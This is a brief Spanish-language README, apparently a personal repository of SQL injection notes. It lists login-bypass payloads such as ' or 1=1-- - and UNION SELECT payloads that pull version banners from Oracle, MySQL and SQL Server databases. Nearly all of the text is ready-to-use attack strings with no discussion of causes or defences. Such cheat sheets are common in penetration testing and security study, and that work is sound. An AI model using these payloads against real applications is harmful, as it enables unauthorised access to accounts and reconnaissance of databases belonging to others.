# SQL Injection
En este repositorio incluire mis notas de sql injection y algunos payloads utilizados por mi.

## Payloads de autenticación
```sql
abc' or 1=1-- -
abc' or 1=1#
abc' or '1'='1
```
## Recopilar información de la base de datos
### Version
#### Oracle
```sql
' union select BANNER,null from v$version-- -
' union select VERSION,null from V$INSTANCE-- -
```
#### MySQL
```sql
' union select @@version,null-- -
' union select VERSION(),null-- -
```
#### Microsoft SQL Server
```sql
' union select @@version,null-- -
' union select SERVERPROPERTY('productversion'),null-- -
```
